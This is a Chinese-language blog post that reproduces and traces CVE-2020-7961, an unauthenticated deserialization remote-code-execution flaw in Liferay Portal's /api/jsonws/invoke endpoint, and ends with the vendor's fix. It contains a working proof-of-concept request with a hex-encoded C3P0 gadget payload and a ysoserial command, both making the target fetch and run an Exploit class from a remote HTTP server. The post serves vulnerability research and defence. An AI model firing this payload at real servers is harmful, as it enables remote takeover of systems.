# CVE-2020-7961 Liferay Portal 复现分析 - tr1ple - 博客园

> 原文：[`www.cnblogs.com/tr1ple/p/12608731.html`](https://www.cnblogs.com/tr1ple/p/12608731.html)

# 漏洞说明：

Liferay 是一个开源的 Portal(认证)产品,提供对多个独立系统的内容集成,为企业信息、流程等的整合提供了一套完整的解决方案,和其他商业产品相比,Liferay 有着很多优良的特性,而且免费,在全球都有较多用户.

该洞是个反序列化导致的 rce，通过未授权访问其 api 传递 json 数据进行反序列化，危害较高

# 影响范围：

Liferay Portal 6.1.X
Liferay Portal 6.2.X
Liferay Portal 7.0.X
Liferay Portal 7.1.X
Liferay Portal 7.2.X

# 环境搭建：

https://github.com/liferay/liferay-portal/releases/tag/7.2.0-ga1 下载带 tomcat 的集成版，接下来就可以运行了，安装过程一路默认配置即可

![](img/979cc6cf30adf91900685cdb89571df6.png)

![](img/347c0ea527e0e643a9701a7ab6e06a3e.png)

# 漏洞复现：

poc：

```
POST /api/jsonws/invoke HTTP/1.1 Host: php.local:8080 Content-Length: 2335 Content-Type: application/x-www-form-urlencoded
Connection: close

cmd={"/expandocolumn/add-column":{}}&p_auth=o3lt8q1F&formDate=1585270368703&tableId=1&name=2&type=3&defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={"userOverridesAsString":"HexAsciiSerializedMap:aced000573720028636f6d2e6d6368616e67652e76322e633370302e506f6f6c4261636b656444617461536f75726365de22cd6cc7ff7fa802000078720035636f6d2e6d6368616e67652e76322e633370302e696d706c2e4162737472616374506f6f6c4261636b656444617461536f75726365000000000000000103000078720031636f6d2e6d6368616e67652e76322e633370302e696d706c2e506f6f6c4261636b656444617461536f757263654261736500000000000000010300084900106e756d48656c706572546872656164734c0018636f6e6e656374696f6e506f6f6c44617461536f757263657400244c6a617661782f73716c2f436f6e6e656374696f6e506f6f6c44617461536f757263653b4c000e64617461536f757263654e616d657400124c6a6176612f6c616e672f537472696e673b4c000a657874656e73696f6e7374000f4c6a6176612f7574696c2f4d61703b4c0014666163746f7279436c6173734c6f636174696f6e71007e00044c000d6964656e74697479546f6b656e71007e00044c00037063737400224c6a6176612f6265616e732f50726f70657274794368616e6765537570706f72743b4c00037663737400224c6a6176612f6265616e732f5665746f61626c654368616e6765537570706f72743b7870770200017372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e000a4c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f727971007e00044c0014636c617373466163746f72794c6f636174696f6e71007e00044c0009636c6173734e616d6571007e00047870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f3132372e302e302e313a383938392f7400076578706c6f697470707070770400000000787702000178;"}
```

本地起 http server 挂载 Exploit.class 字节码文件

![](img/ce729e06b12ed0e7c86fea76e0be40ed.png)

ysoserial c3p0 生成：

```
java -jar ysoserial.jar C3P0 "http://192.168.3.199/:Exploit" > test1.ser
```

然后用以下脚本转为 16 进制：

```
import java.io.*; public class poc { public String encodeHex(InputStream fi) throws IOException { int size;
        String hexStr=""; while ((size=fi.read())!=-1){
            String byteChar = Integer.toHexString(size); if(byteChar.length()<2) {
                byteChar = "0" + byteChar;
            }
           hexStr = hexStr + byteChar;
        } return hexStr;
    } public static void main(String[] args) throws IOException {
    FileInputStream fi = new FileInputStream(new File(System.getProperty("user.dir")+"/src/main/resources/test.ser"));
    poc obj = new poc();
    String pocStr = obj.encodeHex(fi);
    System.out.println(pocStr);
    }
}
```

或者用 mashalsec 直接生成 16 进制 paylaod：![](img/d3040af7dc337262139a2c63e810c7b6.png)

![](img/b2edbe747a9f6829d4dab8b0480c54e0.png)

# 漏洞分析：

[`portal.liferay.dev/docs/7-1/tutorials/-/knowledge_base/t/invoking-json-web-services`](https://portal.liferay.dev/docs/7-1/tutorials/-/knowledge_base/t/invoking-json-web-services) 这里是关于 liferay 的一些说明文档，主要是可以如何通过[`localhost:8080/api/jsonws`](http://localhost:8080/api/jsonws)提供的一些 api

 ![](img/4ecc27634a66590b64a1a85b64fffe03.png)

 可以直接通过 api/jsonws 来查看调用结果或者通过其他形式来调用 api，比如随便调用一个 api，填上对应数据类型的字段，将通过/api/jsonws/invoke 进行调用，可以看到此时参数全部都在 post 包的 body 中

![](img/00ed35cb73dbf88e7a569edac6c27f79.png)

那么实际上是 api/jsonws/invoke 这条路由来处理的请求，那么去 web.xml 下面看一下对应的 serverlet，存在此条 url 匹配规则

![](img/64e0581644725760a6cd022a9d72e709.png)

 找到该 serverlet 对应的类，可以看到此时位于![](img/e3863b47de553ae39d0943c9dd73d4dc.png)

 ![](img/5714b2db412ee9a72155c9bcf2fce5d0.png)

直接找到该类位置

windows 下开启 debug： start.bat 中添加

```
SET CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8788
```

 ![](img/d074d975e0c2ee435d122e7e48401147.png)

 开启 debug，invoke 的 filter 一路走向如上图所示，直到匹配到该 serverlet 的处理逻辑,调用其 service 方法来处理 http 请求

![](img/a32adbc1bb6d8ad308df0c8d1e448d76.png)

```
HttpServletRequest 对象代表客户端的请求，当客户端通过 HTTP 协议访问服务器时，HTTP 请求头中的所有信息都封装在这个对象中，通过这个对象提供的方法，可以获得客户端请求的所有信息。
```

```
 getRequestURL 方法返回客户端发出请求时的完整 URL。
　　getRequestURI 方法返回请求行中的资源名部分。
　　getQueryString 方法返回请求行中的参数部分。
　　getPathInfo 方法返回请求 URL 中的额外路径信息。额外路径信息是请求 URL 中的位于 Servlet 的路径之后和查询参数之前的内容，它以“/”开头。
　　getRemoteAddr 方法返回发出请求的客户机的 IP 地址。
　　getRemoteHost 方法返回发出请求的客户机的完整主机名。
　　getRemotePort 方法返回客户机所使用的网络端口号。
　　getLocalAddr 方法返回 WEB 服务器的 IP 地址。
　　getLocalName 方法返回 WEB 服务器的主机名。
```

Web 应用中 servlet 可以使用 servlet 上下文(context)得到：
1.在调用期间保存和检索属性的功能，并与其他 servlet 共享这些属性。
2.读取 Web 应用中文件内容和其他静态资源的功能。
3.互相发送请求的方式。
4.记录错误和信息化消息的功能。

```
一个 servlet 上下文是 servlet 引擎提供用来服务于 Web 应用的接口。Servlet 上下文具有名字（它属于 Web 应用的名字）唯一映射到文件系统的一个目录。
一个 servlet 可以通过 ServletConfig 对象的 getServletContext()方法得到 servlet 上下文的引用，如果 servlet 直接或间接调用子类 GenericServlet，则可以使用 getServletContext()方法。
```

上图主要是提取请求路径，判断是否来显示 api 列表(path 为""或"/")，否则调用父类的 service 方法处理 http 请求

```
request.getContextPath()可返回站点的根路径，应该是得到项目的名字，如果项目为根目录，则得到一个""，即空的字条串。如果项目为 abc, <%=request.getContextPath()% > 将得到 abc
```

比如要是请求 api/jsonws,则走到下面逻辑

![](img/ebae971fee6a4a3429ed281c5d81888e.png)

接着在重定向方法中设置 http 请求的一些属性，对于该次请求的处理即结束

 ![](img/54df0a2c04d6b0d2744e51a4567e8792.png)

那么话说回去，正常 poc 到其父类的 JSONserverlet 的 service 方法中，调用 jsonWebserviceaction 对象的 execute 来处理 http 请求

![](img/b96c0f51cded33c242ac59c1a89ce467.png)

接着判断 servletContextName 为空则返回 false

![](img/a81107a2286fea5475426206635e41d0.png)

接着到①处拿到 authtype 为空直接 return

 ![](img/b07b28cb27a6ffd0904760a7f5982d26.png)

 直接到 getJSONWebServiceAction()方法中，拿到当前请求的路径为 invoke，则返回一个 invokeaction 实例

![](img/2db124cdb47c80c8fdc1782331f5daf4.png)

 实例化过程中将从 http 请求中拿到参数 cmd 的值

 ![](img/2060b199deaa56d63d22f5b8cf4102a0.png)

 ![](img/7c80e6ad58f4858e20d3e9d153087c00.png)

 接着猜测应该是反射执行该 cmd 的值，cmd 的值也是 json 形式，这里先调用 portal 的 json parser 器解析 cmd 的值反序列化后(非原生反序列化)返回一个 object(hashmap,里面存着 cmd 所代表的键值对)

![](img/19e3a7f7086efaf04eaa3dda9cfb1135.png)

 ![](img/4ea9ce35380aa452beba6e1c2146d1d5.png)

![](img/74b05c2ed28edf8c19756256f5abdda9.png)

 然后再将 hashmap 放到 list 中，这个应该是判断 parser 解析的结果来选择处理方式

![](img/c43e2b0253380729690d4141af9fb50b.png)

接着就是循环遍历该 list 取出其中的 hashmap，并获取迭代器的方式遍历 hashmap，取出保存在其中的键值对，也就是 cmd 对应的键和值，调用 parsestatement 处理主要就是解析出要反射调用的 api

![](img/cdaba14a4e8dd569626ae17e3075df62.png)

接着到 executeStatement 中来进行实际的 api 调用，到目前为止 api 都是以 uri 的方式存在，只是一个虚拟路径，那么在 java 中肯定有相应的处理类，所以肯定要找到它，getJSONWebServiceAction 就完成了这个功能，并且也完成了提取 http body 中的参数作为 api 反射调用的参数，先直接看看该方法调用返回后的 JsonWebserviceAction

![](img/9c399fb28a73a7032052cf99b82adfc5.png)

从 jsonwebServiceAction 的值可以看到又用到了代理的知识，这种设计模式真的是在 java web 网络通信应用中挺常用，从 actionmethod 中就能看到实际上 api 调用的是 proxy 代理类的 addcolumn 方法，那么 proxy 代理的接口是 expandoColumn 接口，可以在注解里面看到其实现类是 ExpandoColumnImpl，并且可以看到实际处理该 api 调用的类为 ExpandoColumnServiceImpl，总之 getJSONwebServiceaction 完成了 api 调用的初始化准备工作，还是有跟一下的必要

![](img/071c693ea77822af04392dc49c4a8cc2.png)

![](img/927a4b8f30b7a36b6eeef6666120d572.png)

 ![](img/2c7f6d4147e01b94f70c9c98ac66c6fd.png)

 到 getJSONWebServiceAction 中看看，其中有个 jsonWebServiceActionParameters.collectAll 又传入了 httpserverletrequest，猜测其要处理 http 请求的内容，跟进

![](img/0e4c801b1bdd91298f03259a67845d45.png)

 进一步获取服务上下文，通过 _getInstance 来实际处理 http 请求中的参数了,要获取 http 请求的相关内容，肯定要用到相关的接口

![](img/1826d1e0a563b0e10ad8e77ee8c50cfe.png)

 ![](img/dfb9de3bd3bd0f7646a58238a7ebbaad.png)

 所以回到 catalina.connector 的 request 类中，将拿到 http 请求的一切内容(提供的获取 http 请求的接口必须走到这个类)

![](img/19987ec8e6ef2ff0c9cd069e343b12d7.png)

![](img/d59bcb84e9f27a167a278cd909fea5c1.png)

最后拿到的含有请求参数的 ParameterMap 如下图所示，所有的参数值都是以=分割，包括我们的序列化数据的其键值对，接着遍历该 map，再将其中的值取出来存到 hashmap 中保存到 attributes 成员变量里

 ![](img/2aed7da81e147bcb97b7f808ad1a5759.png)

然后再赋给服务上下文作为其内部成员变量来使用，真的是挺曲折的==

 ![](img/bfb76f68b74453192dfe34ec49d1e648.png)

 加工完 service context 获取 http 参数后，再将之前获得的相关参数值赋给下图的 jsonWebService 相关变量，之后返回一个 actionImple 的实例，并且这些参数传入，后面猜应该要根据这些值来反射调用方法了![](img/9fac0ac73e9d1a1e1f86f33638a4e9d8.png)

 如下图所示到 _invokeActionMethod 方法中执行

![](img/d0b523d84894df5bc5c34641e15f3a53.png)

 因为之前的解析也已经知道实际上 poc 里面调用的 addcolumn api 是对应的下图的 actionclass 的 addcolumn 重载其一方法，支持转入 4 个参数，包括一个 object，作为 defaultdata 参数名传入，漏洞点就在此![](img/558861303573034ae2fc7097c48980f0.png)

那么接着就要获取 action class 的参数，为了后面进行反射执行，这里调用 _prepareParameters 方法

![](img/477ccda4817a92c36dc77962b283385e.png)

由下图就能看到，此时拿到的参数名，参数类型以及参数值，参数类型就是 Object，参数类型的值即为 C3P0 的绝对路径![](img/c047da0d9380a0db6e334421188f3409.png)

 若参数类型值不为空，则通过类加载机制将其加载到 jvm 中(利用本地 gadget)，这里用 loadclass 来加载该类说明目标对象被装载后不进行链接，这就意味这不会去执行该类静态块中间的内容![](img/9ec56f30308460cbb7549b3d2830a221.png)

 ![](img/13010a218cf3cf23679b14f492762913.png)

 接着因为 default 的参数值不为 void，所以调用 this._convertValueToParameterValue 对参数值进行处理，接着猜测应该是判断这里传入的参数的具体类型

![](img/b1f5df6902f71234dad369741f0759a1.png)

如下图所示也正是如此，判断传入的参数类型，匹配了几种情况后若不满足则将参数值置 null

![](img/2932bb090a14a57a62b72f1aabe38c07.png)

 然后调用 convertType 方法来将此时的 value 和参数类型进行转换后赋值给 parameterValue，然而预置的转换规则并不匹配 poc 中的 c3p0 类

 ![](img/9018f6d74f5881c8cdd13bf9653523cd.png)

接着继续往下走，判断当前的 default 的值是否以{开头，满足则调用 looseDeserialize 来处理，这里也是反序列化的关键点(json 数据反序列化)

![](img/5b8abc31e7f3820ef64cc5d9d0b4cc23.png)

由于 portal 用的是 jodd 的 json 解析，因此此时使用其 jsonParser 对参数值进行扫描

 ![](img/744bd49c8b649cb5f09d7755125d8f38.png)

对于传入的 payload json 数据，jodd 将使用 injectValueIntoObject 将参数的值还原到参数对象中

![](img/9f8f8d3d97cbbba5141472ed3028447f.png)

 ![](img/adf328056c030f514a070abbe474395c.png)

就像 fastjson 反射调用 set 赋值类似，jodd 也通过 json 中的属性来生成 setter 方法，然后反射调用参数对象所代表类的对应 setter 方法来赋值![](img/e5f3ed509abd3a184625f663af107ae1.png)

![](img/1f86bdd4a5cfd37fdf695cf820249e13.png)

 接着就到了 set 方法中，此时将根据解析规则，解析赋给 userOveridesAsString 的值![](img/1eb6f539494d1a8c3441ae6d08c72f52.png)

 存储的 16 进制 payload 将被还原为序列化的字节码文件存储在字节数组中![](img/0d94c6dd039116e33bcdc4719919328a.png)

那么我们知道字节数组肯定不能直接反序列化，所以要如下图转为 ObjectInputStream

 ![](img/58b8cb1db91922ce0ac0638cb0fc3e5c.png)

## 反序列化 gadget

接下来就到了反序列化时刻了，与之前分析的 C3P0 反序列化相同

 ![](img/c790e562f9b3c34ef458abbf7d66ee66.png)

## 整个处理流程总结：

1.根据 uri 的/api/jsonws/invoke 获取 cmd 参数的值，根据其值确定要调用的 api 函数，然后通过动态代理确定要用哪个类来处理具体的 api 调用逻辑

2.确定完处理类后，要传给其参数值，因此到 catalina.connector 中取 http body 中的值，赋给服务上下文作为其内部成员变量做准备

3.接着为反射调用 api 对应成员方法准备入口参数(已经存到 context 中了)，因为 poc 中利用的 api 是支持传入 object 的（漏洞存在的原因，划重点），所以肯定要涉及到根据提供的类的来装载(loadclass 完成)，以及反序列化还原 object，在判断传入的 object 的参数值满足 json 数据前缀后则调用 jodd 库来对 json 数据进行处理，尝试恢复对象，jodd 解析规则根据属性确定 setter 方法，并确定要还原的值(序列化 payload)，到此进入 c3p0 的处理逻辑

4.c3p0 的利用，该类的 setuserOverridesAsString 方法可以将 16 进制编码的序列化数据进行反序列化，序列化数据即为本地的 lib 下的 gadget

从 api 匹配到获取 http body 中的值进行反序列化，从应用程序上来讲问题就是某些 api 的入口参数为 object，然而序列化的数据传输后还原必然要经过反序列化，应用提供了太过于宽泛的反序列化操作，defaultdata 后面的类名可控(以分号分割)

**![](img/f4468f0ccedb5a3f1aa9349096204b91.png)**

感觉也不是 jodd 库的锅，应用里面也匹配反序列化的类，但是对不在匹配规则中的类并未做黑白名单限制，所以说本地只要有能够利用的 gadget，就能够利用

官方的修复方法是：

Disable JSONWS by setting the portal.property `jsonws.servlet.hosts.allowed=Not/Available`

也就是禁用 jsonws 的调用，在 portalimpl.jar 下面有这个 protal.property 配置文件，启动默认加载的，全局生效

![](img/d1de3ed3549cc5c05e4989a5f15df462.png)

另外这个 web 代码量太大了，看的人都晕了，有说的不对的还请指出，本来想找找有没有 xxe，结果:)...

![](img/a4426cb17f24ff24c9940c06ee2bdcf7.png)

# 参考：

[`xz.aliyun.com/t/7485`](https://xz.aliyun.com/t/7485)

[`xz.aliyun.com/t/7499`](https://xz.aliyun.com/t/7499)